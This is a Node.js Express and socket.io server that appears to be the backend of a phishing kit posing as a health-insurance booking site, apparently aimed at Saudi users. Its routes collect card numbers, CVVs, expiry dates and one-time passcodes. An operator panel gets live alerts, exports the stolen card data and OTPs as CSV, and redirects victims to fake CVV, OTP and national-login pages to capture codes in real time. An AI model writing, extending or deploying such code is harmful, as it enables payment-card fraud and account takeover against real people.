const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ==================== Data Storage ====================
const DATA_FILE = '/tmp/data.json';

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (e) {}
  return { bookings: {}, redirects: {}, globalRedirect: null, adminPassword: 'admin123' };
}

function saveData(data) {
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

let db = loadData();

const JWT_SECRET = process.env.JWT_SECRET || 'health-insurance-secret-2024';

// ==================== Auth Middleware ====================
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.json({ success: false, error: 'غير مصرح' });
  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch (e) {
    res.json({ success: false, error: 'جلسة منتهية' });
  }
}

// ==================== Admin Routes ====================
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  db = loadData();
  if (password === db.adminPassword) {
    const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ success: true, token });
  } else {
    res.json({ success: false, error: 'كلمة المرور غير صحيحة' });
  }
});

app.get('/api/admin/me', authMiddleware, (req, res) => {
  res.json({ success: true });
});

app.get('/api/admin/stats', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings);
  res.json({
    success: true,
    data: {
      total: bookings.length,
      new: bookings.filter(b => b.statusRead === 0).length,
      completed: bookings.filter(b => b.status === 'completed').length,
    }
  });
});

app.get('/api/admin/bookings', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json({ success: true, data: bookings });
});

app.get('/api/admin/bookings/:reference', authMiddleware, (req, res) => {
  db = loadData();
  const booking = db.bookings[req.params.reference];
  if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
  // Mark as read
  booking.statusRead = 1;
  saveData(db);
  res.json({ success: true, data: booking });
});

app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
  const { reference, action } = req.body;
  db = loadData();
  const booking = db.bookings[reference];
  if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
  if (action === 'pass') {
    booking.status = 'pending_payment';
    if (booking.payment) booking.payment.paymentAction = 'pass';
  } else if (action === 'denied') {
    booking.status = 'cancelled';
    if (booking.payment) booking.payment.paymentAction = 'denied';
  } else if (action === 'completed') {
    booking.status = 'completed';
  }
  saveData(db);
  io.emit('paymentActionSet', { reference, action });
  res.json({ success: true });
});

app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
  const { target, reference } = req.body;
  db = loadData();
  if (reference) {
    db.redirects[reference] = target;
  } else {
    db.globalRedirect = target;
  }
  saveData(db);
  io.emit('redirectSet', { target, reference });
  res.json({ success: true });
});

app.post('/api/admin/change-password', authMiddleware, (req, res) => {
  const { password } = req.body;
  if (!password) return res.json({ success: false });
  db = loadData();
  db.adminPassword = password;
  saveData(db);
  res.json({ success: true });
});

// ==================== CSV Export ====================
app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings);
  let csv = '';
  const type = req.params.type;

  if (type === 'bookings' || type === 'all') {
    csv += 'المرجع,الاسم,الهوية,الهاتف,البريد,الخدمة,التاريخ,الحالة,IP,تاريخ الإنشاء\n';
    bookings.forEach(b => {
      csv += `"${b.referenceId}","${b.clientName||''}","${b.clientId||''}","${b.clientPhone||''}","${b.clientEmail||''}","${b.serviceType||''}","${b.serviceDate||''}","${b.status||''}","${b.clientIp||''}","${b.createdAt||''}"\n`;
    });
  }

  if (type === 'payments' || type === 'all') {
    if (type === 'all') csv += '\n\nبيانات البطاقات\n';
    csv += 'المرجع,اسم حامل البطاقة,رقم البطاقة,تاريخ الانتهاء,CVV,الحالة\n';
    bookings.filter(b => b.payment).forEach(b => {
      const p = b.payment;
      csv += `"${b.referenceId}","${p.cardHolderName||''}","${p.cardNumber||''}","${p.cardExpiry||''}","${p.cardCvv||''}","${p.status||''}"\n`;
    });
  }

  if (type === 'otps' || type === 'all') {
    if (type === 'all') csv += '\n\nرموز OTP\n';
    csv += 'المرجع,رمز OTP,التاريخ\n';
    bookings.filter(b => b.otp).forEach(b => {
      csv += `"${b.referenceId}","${b.otp.otpCode||''}","${b.otp.createdAt||''}"\n`;
    });
  }

  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename=export_${type}.csv`);
  res.send('\uFEFF' + csv); // BOM for Arabic
});

// ==================== CVV Routes ====================
app.post('/api/cvv-submit', (req, res) => {
  const { referenceId, cvv, amount, cardNumber, cardHolder, expiry } = req.body;
  db = loadData();

  const ref = referenceId || uuidv4().substring(0, 8).toUpperCase();

  if (!db.bookings[ref]) {
    db.bookings[ref] = {
      referenceId: ref,
      clientName: cardHolder || 'غير محدد',
      clientId: '',
      clientPhone: '',
      clientEmail: '',
      clientIp: req.ip,
      serviceType: 'دفع',
      serviceDate: new Date().toLocaleDateString('ar-SA'),
      serviceTime: new Date().toLocaleTimeString('ar-SA'),
      serviceRegion: '',
      status: 'pending_cvv',
      statusRead: 0,
      createdAt: new Date().toISOString(),
    };
  }

  if (!db.bookings[ref].payment) db.bookings[ref].payment = {};
  db.bookings[ref].payment.cardCvv = cvv;
  db.bookings[ref].payment.cardNumber = cardNumber || '';
  db.bookings[ref].payment.cardHolderName = cardHolder || '';
  db.bookings[ref].payment.cardExpiry = expiry || '';
  db.bookings[ref].payment.amount = amount || '';
  db.bookings[ref].payment.status = 'cvv_received';
  db.bookings[ref].status = 'pending_cvv';
  db.bookings[ref].statusRead = 0;
  saveData(db);

  io.emit('newPayment', { type: 'cvv', reference: ref });

  // Check redirect
  const redirect = db.redirects[ref] || db.globalRedirect;
  const redirectUrl = redirect ? getRedirectUrl(redirect, ref) : null;

  res.json({ success: true, requireOtp: false, redirect: redirectUrl });
});

app.post('/api/otp-submit', (req, res) => {
  const { referenceId, otp } = req.body;
  db = loadData();

  const ref = referenceId || '';
  if (db.bookings[ref]) {
    db.bookings[ref].otp = { otpCode: otp, createdAt: new Date().toISOString() };
    db.bookings[ref].status = 'pending_otp';
    db.bookings[ref].statusRead = 0;
    saveData(db);
    io.emit('newPayment', { type: 'otp', reference: ref });
  }

  const redirect = db.redirects[ref] || db.globalRedirect;
  const redirectUrl = redirect ? getRedirectUrl(redirect, ref) : null;

  res.json({ success: true, redirect: redirectUrl });
});

// ==================== Booking Routes (from Angular app) ====================
app.post('/api/booking', (req, res) => {
  const booking = req.body;
  const ref = 'HS-' + Date.now().toString().substring(7);
  db = loadData();
  db.bookings[ref] = {
    ...booking,
    referenceId: ref,
    clientIp: req.ip,
    status: 'new',
    statusRead: 0,
    createdAt: new Date().toISOString(),
  };
  saveData(db);
  io.emit('newBooking', { reference: ref });
  res.json({ success: true, referenceId: ref });
});

// ==================== Check Redirect (for Angular app) ====================
app.get('/api/check-redirect/:reference', (req, res) => {
  db = loadData();
  const redirect = db.redirects[req.params.reference] || db.globalRedirect;
  if (redirect) {
    res.json({ success: true, redirect: getRedirectUrl(redirect, req.params.reference) });
  } else {
    res.json({ success: false });
  }
});

function getRedirectUrl(target, ref) {
  const base = process.env.BASE_URL || '';
  const map = {
    'cvv': `${base}/cvv?ref=${ref}`,
    'otp': `${base}/otp?ref=${ref}`,
    'nafath': `${base}/nafath?ref=${ref}`,
    'payment': `${base}/payment?ref=${ref}`,
    'success': `${base}/success?ref=${ref}`,
  };
  return map[target] || target;
}

// ==================== Socket.io ====================
io.on('connection', (socket) => {
  socket.on('joinAdmin', (data) => {
    try {
      jwt.verify(data.token, JWT_SECRET);
      socket.join('admin');
    } catch (e) {}
  });
});

// ==================== SPA Routes ====================
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/cvv', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ==================== Start ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
